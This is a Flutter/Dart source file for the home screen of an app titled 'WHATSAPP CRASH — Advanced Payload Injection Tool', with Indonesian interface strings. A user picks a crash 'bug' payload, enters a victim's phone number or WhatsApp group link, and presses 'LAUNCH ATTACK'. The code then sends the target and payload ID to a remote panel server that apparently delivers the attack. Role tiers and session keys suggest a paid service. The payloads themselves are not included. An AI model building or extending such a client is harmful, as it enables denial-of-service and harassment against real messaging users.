import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _pulseController;
  late VideoPlayerController _videoController;

  int _currentPayloadIndex = 0;

  String _selectedBugMode = "number";
  String _senderMode = "private";
  int _privateSenderCount = 0;
  int _globalSenderCount = 0;
  bool _isSending = false;

  // ==================== WARNA UNGU ====================
  static const Color _bgDeep = Color(0xFF020103);
  static const Color _bgCard = Color(0xFF0B0614);
  static const Color _bgSection = Color(0xFF12091E);

  static const Color _purple = Color(0xFFA64DFF);
  static const Color _purpleBright = Color(0xFFD38BFF);
  static const Color _purpleDark = Color(0xFF5A1D9A);

  static const Color _textMuted = Color(0xFFBFA8FF);
  static const Color _textSubtle = Color(0xFF7D68B5);
  static const Color _border = Color(0xFF5C2D91);

  @override
  void initState() {
    super.initState();

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    _videoController = VideoPlayerController.asset('assets/videos/bug.mp4')
      ..initialize().then((_) {
        setState(() {});
        _videoController.setLooping(true);
        _videoController.setVolume(1.0);
        _videoController.play();
      }).catchError((e) {
        debugPrint("Video init error: $e");
      });

    final initialBugs = _getFilteredBugs();
    if (initialBugs.isNotEmpty) {
      _currentPayloadIndex = 0;
    }

    _fetchSenderStats();
  }

  List<Map<String, dynamic>> _getFilteredBugs() {
    if (_selectedBugMode == "group") {
      return widget.listBug.where((b) => b['bug_id'].contains('_group')).toList();
    } else {
      return widget.listBug.where((b) => !b['bug_id'].contains('_group')).toList();
    }
  }

  String? get _selectedBugId {
    final bugs = _getFilteredBugs();
    if (bugs.isEmpty) return null;
    if (_currentPayloadIndex >= bugs.length) _currentPayloadIndex = 0;
    return bugs[_currentPayloadIndex]['bug_id'];
  }

  Future<void> _fetchSenderStats() async {
    try {
      final res = await http.get(Uri.parse(
          "http://elainakurumipanelpanel.xtxintax.my.id:2045/getSenderStats?key=${widget.sessionKey}"));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true) {
          setState(() {
            _privateSenderCount = data['private'] ?? 0;
            _globalSenderCount = data['global'] ?? 0;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching sender stats: $e");
    }
  }

  @override
  void dispose() {
    _pulseController.dispose();
    _videoController.dispose();
    targetController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('') || cleaned.length < 8) return null;
    return cleaned;
  }

  bool isValidGroupLink(String input) {
    return input.contains('chat.whatsapp.com') && input.contains('https://');
  }

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final key = widget.sessionKey;
    final bugId = _selectedBugId;

    if (_selectedBugMode == "number") {
      final target = formatPhoneNumber(rawInput);
      if (target == null || key.isEmpty) {
        _showAlert("Invalid Number", "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
        return;
      }
    } else {
      if (!isValidGroupLink(rawInput)) {
        _showAlert("Invalid Link", "Masukkan link group WA yang valid (contoh: https://chat.whatsapp.com/...).");
        return;
      }
    }

    if (bugId == null) {
      _showAlert("Error", "Tidak ada payload tersedia untuk mode ini.");
      return;
    }

    setState(() { _isSending = true; });

    final effectiveSenderMode = (widget.role == 'owner' || widget.role == 'vip' || widget.role == 'founder' || widget.role == 'developer' || widget.role == 'moderator') ? _senderMode : 'private';

    try {
      final res = await http.get(Uri.parse(
          "http://elainakurumipanelpanel.xtxintax.my.id:2045/sendBug?key=$key&target=$rawInput&bug=$bugId&senderMode=$effectiveSenderMode"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        _showAlert("⏳ Cooldown", "Tunggu beberapa saat sebelum mengirim lagi.");
      } else if (data["valid"] == false) {
        _showAlert("❌ Key Invalid", "Sesi Anda tidak valid. Silakan login ulang.");
      } else if (data["sended"] == false) {
        _showAlert("⚠️ Gagal", "Server sedang maintenance atau terjadi kegagalan.");
      } else {
        _showAlert("✅ Berhasil", "Bug sukses dikirim ke target!");
        targetController.clear();
        _fetchSenderStats();
      }
    } catch (_) {
      _showAlert("❌ Error", "Terjadi kesalahan pada sistem. Coba lagi nanti.");
    } finally {
      setState(() { _isSending = false; });
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      barrierColor: Colors.black.withValues(alpha: 0.8),
      builder: (_) => AlertDialog(
        backgroundColor: _bgCard,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _purple.withValues(alpha: 0.25)),
        ),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(color: _purple.withValues(alpha: 0.12), borderRadius: BorderRadius.circular(10)),
              child: const Icon(Icons.info_outline, color: _purple, size: 20),
            ),
            const SizedBox(width: 12),
            Flexible(
              child: Text(title, style: const TextStyle(color: _purple, fontFamily: 'Orbitron', fontWeight: FontWeight.bold, fontSize: 14)),
            ),
          ],
        ),
        content: Text(msg, style: const TextStyle(color: _textMuted, fontFamily: 'ShareTechMono', fontSize: 13)),
        actions: [
          Container(
            decoration: BoxDecoration(color: _purple.withValues(alpha: 0.10), borderRadius: BorderRadius.circular(10), border: Border.all(color: _purple.withValues(alpha: 0.25))),
            child: TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text("OK", style: TextStyle(color: _purple, fontFamily: 'Orbitron', fontWeight: FontWeight.bold, fontSize: 12)),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildTopHeader() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: _bgCard,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _purple.withValues(alpha: 0.25), width: 1.5),
        boxShadow: [
          BoxShadow(color: _purple.withValues(alpha: 0.08), blurRadius: 30, spreadRadius: 2),
        ],
        gradient: LinearGradient(colors: [_purple.withValues(alpha: 0.08), Colors.transparent], begin: Alignment.topLeft, end: Alignment.bottomRight),
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: _purple.withValues(alpha: 0.15),
              shape: BoxShape.circle,
              border: Border.all(color: _purple.withValues(alpha: 0.5)),
              boxShadow: [BoxShadow(color: _purple.withValues(alpha: 0.2), blurRadius: 15, spreadRadius: 1)],
            ),
            child: const Icon(Icons.bug_report_outlined, color: _purple, size: 28),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text("WHATSAPP CRASH", style: TextStyle(color: _purple, fontFamily: 'Orbitron', fontWeight: FontWeight.w900, fontSize: 18, letterSpacing: 2)),
                const SizedBox(height: 6),
                Text("Advanced Payload Injection Tool", style: TextStyle(color: _textMuted, fontFamily: 'ShareTechMono', fontSize: 11, letterSpacing: 0.5)),
              ],
            ),
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            decoration: BoxDecoration(color: _purple.withValues(alpha: 0.10), borderRadius: BorderRadius.circular(20), border: Border.all(color: _purple.withValues(alpha: 0.3))),
            child: Text(widget.role.toUpperCase(), style: const TextStyle(color: _purple, fontSize: 10, fontFamily: 'Orbitron', fontWeight: FontWeight.bold, letterSpacing: 1)),
          ),
        ],
      ),
    );
  }

  Widget _buildVideoBox() {
    return Container(
      height: 200,
      width: double.infinity,
      decoration: BoxDecoration(
        color: Colors.black,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _purple.withValues(alpha: 0.15), width: 1),
        boxShadow: [
          BoxShadow(color: _purple.withValues(alpha: 0.05), blurRadius: 20, spreadRadius: 0),
        ],
      ),
      clipBehavior: Clip.antiAlias,
      child: _videoController.value.isInitialized
          ? SizedBox(
              width: double.infinity,
              height: double.infinity,
              child: FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _videoController.value.size.width,
                  height: _videoController.value.size.height,
                  child: VideoPlayer(_videoController),
                ),
              ),
            )
          : const SizedBox(),
    );
  }

  Widget _buildModeSelector() {
    return Row(
      children: [
        Expanded(
          child: GestureDetector(
            onTap: () {
              setState(() {
                _selectedBugMode = "number";
                targetController.clear();
                _currentPayloadIndex = 0;
              });
            },
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 250),
              padding: const EdgeInsets.symmetric(vertical: 14),
              decoration: BoxDecoration(
                color: _selectedBugMode == "number" ? _purple.withValues(alpha: 0.08) : Colors.transparent,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _selectedBugMode == "number" ? _purple.withValues(alpha: 0.6) : _border, width: _selectedBugMode == "number" ? 1.5 : 1),
                boxShadow: _selectedBugMode == "number" ? [BoxShadow(color: _purple.withValues(alpha: 0.08), blurRadius: 12, spreadRadius: 0)] : [],
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.phone_android_rounded, color: _selectedBugMode == "number" ? _purple : _textMuted, size: 18),
                  const SizedBox(width: 8),
                  Text("BUG NOMOR", style: TextStyle(color: _selectedBugMode == "number" ? _purple : _textMuted, fontWeight: FontWeight.bold, fontSize: 13, fontFamily: 'ShareTechMono')),
                ],
              ),
            ),
          ),
        ),
        const SizedBox(width: 12),
        Expanded(
          child: GestureDetector(
            onTap: () {
              setState(() {
                _selectedBugMode = "group";
                targetController.clear();
                _currentPayloadIndex = 0;
              });
            },
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 250),
              padding: const EdgeInsets.symmetric(vertical: 14),
              decoration: BoxDecoration(
                color: _selectedBugMode == "group" ? _purple.withValues(alpha: 0.08) : Colors.transparent,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _selectedBugMode == "group" ? _purple.withValues(alpha: 0.6) : _border, width: _selectedBugMode == "group" ? 1.5 : 1),
                boxShadow: _selectedBugMode == "group" ? [BoxShadow(color: _purple.withValues(alpha: 0.08), blurRadius: 12, spreadRadius: 0)] : [],
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.group_add, color: _selectedBugMode == "group" ? _purple : _textMuted, size: 18),
                  const SizedBox(width: 8),
                  Text("BUG GROUP", style: TextStyle(color: _selectedBugMode == "group" ? _purple : _textMuted, fontWeight: FontWeight.bold, fontSize: 13, fontFamily: 'ShareTechMono')),
                ],
              ),
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildSenderToggle() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: _bgCard, borderRadius: BorderRadius.circular(16), border: Border.all(color: _purple.withValues(alpha: 0.10))),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.swap_horiz_rounded, color: _purple.withValues(alpha: 0.7), size: 16),
              const SizedBox(width: 8),
              const Text("SENDER MODE", style: TextStyle(color: _purple, fontWeight: FontWeight.bold, fontSize: 11, fontFamily: 'Orbitron', letterSpacing: 1.5)),
            ],
          ),
          const SizedBox(height: 12),
          Row(
            children: [
              Expanded(
                child: GestureDetector(
                  onTap: () => setState(() => _senderMode = 'private'),
                  child: AnimatedContainer(
                    duration: const Duration(milliseconds: 250),
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(
                      color: _senderMode == 'private' ? _purple.withValues(alpha: 0.08) : _bgSection,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: _senderMode == 'private' ? _purple.withValues(alpha: 0.5) : _border, width: _senderMode == 'private' ? 1.5 : 1),
                    ),
                    child: Column(
                      children: [
                        Text("PRIVATE", style: TextStyle(color: _senderMode == 'private' ? _purple : _textMuted, fontWeight: FontWeight.bold, fontSize: 12, fontFamily: 'ShareTechMono')),
                        const SizedBox(height: 4),
                        Text("$_privateSenderCount Active", style: TextStyle(color: _senderMode == 'private' ? Colors.white54 : _textSubtle, fontSize: 10)),
                      ],
                    ),
                  ),
                ),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: GestureDetector(
                  onTap: () => setState(() => _senderMode = 'global'),
                  child: AnimatedContainer(
                    duration: const Duration(milliseconds: 250),
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(
                      color: _senderMode == 'global' ? _purple.withValues(alpha: 0.08) : _bgSection,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: _senderMode == 'global' ? _purple.withValues(alpha: 0.5) : _border, width: _senderMode == 'global' ? 1.5 : 1),
                    ),
                    child: Column(
                      children: [
                        Text("GLOBAL", style: TextStyle(color: _senderMode == 'global' ? _purple : _textMuted, fontWeight: FontWeight.bold, fontSize: 12, fontFamily: 'ShareTechMono')),
                        const SizedBox(height: 4),
                        Text("$_globalSenderCount Active", style: TextStyle(color: _senderMode == 'global' ? Colors.white54 : _textSubtle, fontSize: 10)),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildPayloadCarousel() {
    final bugs = _getFilteredBugs();
    if (bugs.isEmpty) {
      return Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: _bgSection,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _border),
        ),
        child: const Center(
          child: Text(
            "No payload available",
            style: TextStyle(color: _textMuted),
          ),
        ),
      );
    }

    if (_currentPayloadIndex >= bugs.length) _currentPayloadIndex = 0;

    return Column(
      children: [
        Container(
          padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 16),
          decoration: BoxDecoration(
            color: _purple.withOpacity(0.05),
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: _purple.withOpacity(0.15)),
          ),
          child: Text(
            bugs[_currentPayloadIndex]['bug_name'] ?? 'Payload',
            style: const TextStyle(
              color: _purple,
              fontSize: 16,
              fontWeight: FontWeight.w700,
              fontFamily: 'Orbitron',
              letterSpacing: 0.5,
            ),
            textAlign: TextAlign.center,
          ),
        ),
        const SizedBox(height: 12),
        SizedBox(
          height: 80,
          child: PageView.builder(
            itemCount: bugs.length,
            controller: PageController(initialPage: _currentPayloadIndex),
            onPageChanged: (index) {
              setState(() {
                _currentPayloadIndex = index;
              });
            },
            itemBuilder: (context, index) {
              final bug = bugs[index];
              final isActive = index == _currentPayloadIndex;
              return AnimatedContainer(
                duration: const Duration(milliseconds: 200),
                margin: const EdgeInsets.symmetric(horizontal: 8),
                decoration: BoxDecoration(
                  color: isActive ? _purple.withOpacity(0.08) : Colors.transparent,
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(
                    color: isActive ? _purple.withOpacity(0.5) : _border,
                    width: isActive ? 1.5 : 1,
                  ),
                ),
                child: Center(
                  child: Padding(
                    padding: const EdgeInsets.all(12),
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(
                          Icons.bug_report_outlined,
                          color: isActive ? _purple : _textMuted,
                          size: 24,
                        ),
                        const SizedBox(height: 4),
                        Text(
                          bug['bug_id'] ?? 'ID',
                          style: TextStyle(
                            color: isActive ? _purple : _textMuted,
                            fontSize: 11,
                            fontWeight: FontWeight.w500,
                            fontFamily: 'ShareTechMono',
                          ),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                        ),
                      ],
                    ),
                  ),
                ),
              );
            },
          ),
        ),
        const SizedBox(height: 8),
        Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: List.generate(bugs.length, (index) {
            return AnimatedContainer(
              duration: const Duration(milliseconds: 200),
              margin: const EdgeInsets.symmetric(horizontal: 4),
              width: index == _currentPayloadIndex ? 20 : 8,
              height: 8,
              decoration: BoxDecoration(
                color: index == _currentPayloadIndex ? _purple : _textSubtle,
                borderRadius: BorderRadius.circular(4),
              ),
            );
          }),
        ),
      ],
    );
  }

  Widget _buildInputPanel() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: _bgCard,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _purple.withValues(alpha: 0.10)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          _buildModeSelector(),
          const SizedBox(height: 24),
          Padding(
            padding: const EdgeInsets.only(left: 4, bottom: 8),
            child: Text(
              _selectedBugMode == "number" ? "TARGET NUMBER" : "WHATSAPP GROUP LINK",
              style: const TextStyle(
                color: _purple,
                fontWeight: FontWeight.bold,
                fontSize: 11,
                fontFamily: 'Orbitron',
                letterSpacing: 1.5,
              ),
            ),
          ),
          TextField(
            controller: targetController,
            style: const TextStyle(color: Colors.white, fontSize: 15),
            cursorColor: _purple,
            keyboardType: _selectedBugMode == "number" ? TextInputType.phone : TextInputType.url,
            decoration: InputDecoration(
              hintText: _selectedBugMode == "number" ? "e.g. +628xxxxxxxx" : "e.g. https://chat.whatsapp.com/...",
              hintStyle: const TextStyle(color: _textSubtle, fontSize: 13),
              filled: true,
              fillColor: _bgSection,
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(14),
                borderSide: BorderSide(color: _border),
              ),
              enabledBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(14),
                borderSide: BorderSide(color: _border),
              ),
              focusedBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(14),
                borderSide: BorderSide(color: _purple.withValues(alpha: 0.5), width: 1.5),
              ),
              prefixIcon: Icon(
                _selectedBugMode == "number" ? Icons.phone_android_rounded : Icons.link,
                color: _purple.withValues(alpha: 0.5),
              ),
              contentPadding: const EdgeInsets.symmetric(vertical: 16, horizontal: 20),
            ),
          ),
          const SizedBox(height: 22),
          const Padding(
            padding: EdgeInsets.only(left: 4, bottom: 8),
            child: Text(
              "𝐆𝐄𝐒𝐄𝐑 𝐊𝐀𝐍𝐀𝐍 𝐊𝐈𝐑𝐈 𝐔𝐍𝐓𝐔𝐊 𝐏𝐈𝐋𝐈𝐇 𝐅𝐈𝐓𝐔𝐑",
              style: TextStyle(
                color: _purple,
                fontWeight: FontWeight.bold,
                fontSize: 11,
                fontFamily: 'Orbitron',
                letterSpacing: 1.5,
              ),
            ),
          ),
          _buildPayloadCarousel(),
        ],
      ),
    );
  }

  Widget _buildSendButton() {
    return AnimatedBuilder(
      animation: _pulseController,
      builder: (context, child) {
        final glow = _pulseController.value;
        return Container(
          height: 60,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: _purple.withValues(alpha: 0.3 + 0.2 * glow)),
            gradient: LinearGradient(colors: [_purple.withValues(alpha: 0.15 + 0.1 * glow), _purpleDark.withValues(alpha: 0.10 + 0.05 * glow)]),
            boxShadow: [BoxShadow(color: _purple.withValues(alpha: 0.08 * glow), blurRadius: 25, spreadRadius: 2)],
          ),
          child: ElevatedButton(
            onPressed: _isSending ? null : _sendBug,
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.transparent,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
              elevation: 0,
              shadowColor: Colors.transparent,
            ),
            child: _isSending
                ? const SizedBox(
                    height: 24,
                    width: 24,
                    child: CircularProgressIndicator(color: _purple, strokeWidth: 2.5),
                  )
                : Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Icon(Icons.rocket_launch_outlined, color: _purple, size: 20),
                      const SizedBox(width: 12),
                      Text(
                        "LAUNCH ATTACK",
                        style: TextStyle(
                          color: _purple,
                          fontWeight: FontWeight.w900,
                          fontSize: 15,
                          letterSpacing: 2,
                          fontFamily: 'Orbitron',
                        ),
                      ),
                    ],
                  ),
          ),
        );
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bgDeep,
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 20),
          physics: const BouncingScrollPhysics(),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              _buildTopHeader(),
              const SizedBox(height: 14),
              _buildVideoBox(),
              const SizedBox(height: 20),
              _buildInputPanel(),
              const SizedBox(height: 16),
              if (widget.role == 'owner' || widget.role == 'vip' || widget.role == 'founder' || widget.role == 'developer' || widget.role == 'moderator') ...[
                _buildSenderToggle(),
                const SizedBox(height: 16),
              ],
              _buildSendButton(),
              const SizedBox(height: 40),
              Center(
                child: Text(
                  "Session: ${widget.expiredDate}",
                  style: TextStyle(
                    color: _textSubtle,
                    fontSize: 10,
                    fontFamily: 'ShareTechMono',
                  ),
                ),
              ),
              const SizedBox(height: 80), // 🔥 FIX: Tambah padding bottom
            ],
          ),
        ),
      ),
    );
  }
}